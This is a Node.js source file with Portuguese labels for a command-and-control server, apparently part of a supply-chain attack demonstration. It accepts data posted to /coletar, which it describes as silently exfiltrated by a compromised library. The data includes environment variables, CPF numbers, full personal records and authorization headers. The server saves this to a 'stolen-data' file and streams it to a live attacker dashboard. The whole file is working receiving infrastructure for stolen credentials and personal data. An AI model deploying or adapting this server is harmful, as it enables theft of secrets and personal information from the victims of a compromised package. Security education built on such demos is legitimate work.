const http = require("http");
const fs = require("fs");
const path = require("path");

const PORTA = 3001;
const ARQUIVO_LOG = path.join(__dirname, "..", "stolen-data", "dados-roubados.json");
let contadorColetas = 0;

const clientesSSE = new Set();

function transmitirEvento(dados) {
  const payload = "data: " + JSON.stringify(dados) + "\n\n";
  for (const c of clientesSSE) c.write(payload);
}

const cor = {
  r: "\x1b[31m", g: "\x1b[32m", y: "\x1b[33m", c: "\x1b[36m",
  w: "\x1b[37m", b: "\x1b[1m", x: "\x1b[0m", bg: "\x1b[41m",
};

const pastaLog = path.dirname(ARQUIVO_LOG);
if (!fs.existsSync(pastaLog)) fs.mkdirSync(pastaLog, { recursive: true });
fs.writeFileSync(ARQUIVO_LOG, "[]");

function logCabecalho() {
  console.clear();
  console.log(cor.r + cor.b + "\n  Servidor C2 (Command and Control — servidor remoto que recebe os dados roubados)" + cor.x);
  console.log(cor.y + "  Dashboard:  http://localhost:" + PORTA);
  console.log("  SSE stream: http://localhost:" + PORTA + "/logs/stream");
  console.log("  Aguardando dados...\n" + cor.x);
}

function logDadosRecebidos(dados) {
  contadorColetas++;
  console.log(cor.bg + cor.w + " COLETA #" + contadorColetas + " " + cor.x);
  console.log(cor.c + "  " + dados.timestamp + " | " + dados.hostname + " | " + dados.dados.length + " item(ns)" + cor.x);

  dados.dados.forEach((item) => {
    console.log(cor.y + "  [" + item.tipo + "]" + cor.x);
    switch (item.tipo) {
      case "VARIAVEIS_DE_AMBIENTE":
        for (const [k, v] of Object.entries(item.capturadas))
          console.log(cor.r + "    " + k + " = " + v + cor.x);
        break;
      case "CPF":
        console.log(cor.r + "    CPF: " + item.valor + cor.x);
        break;
      case "CADASTRO_COMPLETO":
        for (const [k, v] of Object.entries(item.dados))
          console.log(cor.r + "    " + k + ": " + v + cor.x);
        break;
      case "DADOS_SENSIVEIS_EM_TEXTO":
        for (const [t, v] of Object.entries(item.encontrados))
          console.log(cor.r + "    " + t + ": " + JSON.stringify(v) + cor.x);
        break;
      case "REQUISICAO_HTTP":
        console.log(cor.r + "    " + item.metodo + " " + item.url + cor.x);
        if (item.body && Object.keys(item.body).length)
          console.log(cor.r + "    body: " + JSON.stringify(item.body) + cor.x);
        break;
    }
  });
  console.log(cor.g + "  Total: " + contadorColetas + " coleta(s)\n" + cor.x);
}

// ─── Dashboard HTML ──────────────────────────────────────────

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <title>C2 Dashboard</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;font-size:14px}
    header{background:#1a0000;border-bottom:2px solid #cc0000;padding:16px 24px;display:flex;align-items:center;gap:16px}
    header h1{color:#ff3333;font-size:20px}
    .bar{background:#111;border-bottom:1px solid #333;padding:8px 24px;display:flex;gap:32px;font-size:12px;color:#888}
    .bar span{color:#0f0} #cnt{color:#f44;font-weight:bold}
    main{padding:20px 24px}
    #feed{display:flex;flex-direction:column;gap:12px}
    .card{background:#111;border:1px solid #2a0000;border-left:4px solid #cc0000;border-radius:6px;padding:14px 18px;animation:in .4s ease}
    @keyframes in{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
    .ch{display:flex;justify-content:space-between;margin-bottom:10px}
    .cn{color:#f44;font-weight:bold;font-size:16px} .ct{color:#555;font-size:11px}
    .meta{display:flex;gap:20px;margin-bottom:10px;flex-wrap:wrap;font-size:12px}
    .ml{color:#555} .mv{color:#88ccff}
    .itens{display:flex;flex-direction:column;gap:8px;margin-top:10px}
    .item{background:#0e0e0e;border:1px solid #1a1a1a;border-radius:4px;padding:10px 14px}
    .it{font-size:11px;font-weight:bold;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
    .tipo-VARIAVEIS_DE_AMBIENTE .it{color:#f80}
    .tipo-CPF .it,.tipo-CADASTRO_COMPLETO .it{color:#f44}
    .tipo-DADOS_SENSIVEIS_EM_TEXTO .it{color:#fc0}
    .tipo-REQUISICAO_HTTP .it{color:#a8f}
    .ic{display:flex;gap:8px;font-size:13px;padding:2px 0}
    .ik{color:#666;min-width:120px} .iv{color:#f66;word-break:break-all}
    .empty{text-align:center;color:#333;padding:60px 0;font-size:16px}
    .pulse{animation:p 1s infinite;display:inline-block}
    @keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
  </style>
</head>
<body>
  <header><h1>C2 (Command and Control) — Servidor do Atacante</h1><span style="font-size:11px;color:#666;align-self:flex-end;padding-bottom:2px">Dados recebidos via exfiltracao silenciosa da lib comprometida</span></header>
  <div class="bar">
    <div>SSE: <span id="st">conectando...</span></div>
    <div>Coletas: <span id="cnt">0</span></div>
  </div>
  <main>
    <div id="feed">
      <div class="empty" id="empty"><span class="pulse">...</span> Aguardando dados exfiltrados</div>
    </div>
  </main>
  <script>
    const feed=document.getElementById("feed"),cnt=document.getElementById("cnt"),st=document.getElementById("st");
    let t=0;
    const sse=new EventSource("/logs/stream");
    sse.onopen=()=>{st.textContent="conectado";st.style.color="#0f0"};
    sse.onerror=()=>{st.textContent="desconectado";st.style.color="#f44"};
    sse.onmessage=(e)=>{
      const d=JSON.parse(e.data);t++;cnt.textContent=t;
      document.getElementById("empty")?.remove();
      feed.insertBefore(card(d,t),feed.firstChild);
    };
    function card(d,n){
      const c=document.createElement("div");c.className="card";
      c.innerHTML=\`<div class="ch"><span class="cn">Coleta #\${n}</span><span class="ct">\${d.timestamp}</span></div>
        <div class="meta">
          <div><span class="ml">Host: </span><span class="mv">\${d.hostname}</span></div>
          <div><span class="ml">OS: </span><span class="mv">\${d.plataforma}</span></div>
          <div><span class="ml">Lib: </span><span class="mv">\${d.origem_lib}</span></div>
        </div>
        <div class="itens">\${d.dados.map(renderItem).join("")}</div>\`;
      return c;
    }
    function renderItem(i){
      let f="";
      if(i.tipo==="VARIAVEIS_DE_AMBIENTE")f=Object.entries(i.capturadas).map(([k,v])=>kv(k,v)).join("");
      else if(i.tipo==="CPF")f=kv("CPF",i.valor);
      else if(i.tipo==="CADASTRO_COMPLETO")f=Object.entries(i.dados).map(([k,v])=>kv(k,v)).join("");
      else if(i.tipo==="DADOS_SENSIVEIS_EM_TEXTO"){f=Object.entries(i.encontrados).map(([k,v])=>kv(k,JSON.stringify(v))).join("");f+=kv("texto",i.texto_original)}
      else if(i.tipo==="REQUISICAO_HTTP"){f=kv(i.metodo,i.url);if(i.headers?.authorization)f+=kv("auth",i.headers.authorization);if(i.body)f+=kv("body",JSON.stringify(i.body))}
      return \`<div class="item tipo-\${i.tipo}"><div class="it">\${i.tipo.replace(/_/g," ")}</div>\${f}</div>\`;
    }
    function kv(k,v){return \`<div class="ic"><span class="ik">\${k}</span><span class="iv">\${v}</span></div>\`}
  </script>
</body>
</html>`;

// ─── Servidor ────────────────────────────────────────────────

const servidor = http.createServer((req, res) => {
  if (req.method === "GET" && req.url === "/") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(DASHBOARD_HTML);
    return;
  }

  if (req.method === "GET" && req.url === "/logs/stream") {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
      "Access-Control-Allow-Origin": "*",
    });
    res.write(": conectado\n\n");
    clientesSSE.add(res);
    req.on("close", () => clientesSSE.delete(res));
    return;
  }

  if (req.method === "POST" && req.url === "/coletar") {
    let corpo = "";
    req.on("data", (p) => { corpo += p.toString(); });
    req.on("end", () => {
      try {
        const dados = JSON.parse(corpo);
        const existentes = JSON.parse(fs.readFileSync(ARQUIVO_LOG, "utf-8"));
        existentes.push(dados);
        fs.writeFileSync(ARQUIVO_LOG, JSON.stringify(existentes, null, 2));
        logDadosRecebidos(dados);
        transmitirEvento(dados);
        res.writeHead(200);
        res.end("ok");
      } catch {
        res.writeHead(400);
        res.end("erro");
      }
    });
    return;
  }

  res.writeHead(404);
  res.end("nao encontrado");
});

servidor.listen(PORTA, () => logCabecalho());
